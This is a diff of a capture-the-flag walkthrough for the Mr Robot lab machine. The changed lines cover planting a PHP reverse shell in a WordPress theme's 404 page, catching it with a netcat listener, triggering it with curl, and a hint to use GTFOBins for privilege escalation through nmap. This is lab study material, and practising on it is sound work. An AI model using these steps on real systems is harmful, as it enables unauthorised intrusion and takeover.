@@ -188,7 +188,7 @@ Copy and paste Pentestmonkey PHP Reverse Shell script. (Don't forget to set the 
 
 		nc -lvp 7777
 
-### Access the page to get reverse shell running
+### Access the page to get reverse shell running (can also just access in browser)
 
 		
 		curl mrrobot/wp-content/themes/twentyfourteen/404.php
@@ -206,3 +206,5 @@ there's nmap!
 		whoami
 
 
+
+why nmap? google for "gtfobins". if you have suid or sudo permissions, that webside will tell you if you can use it to priv esc
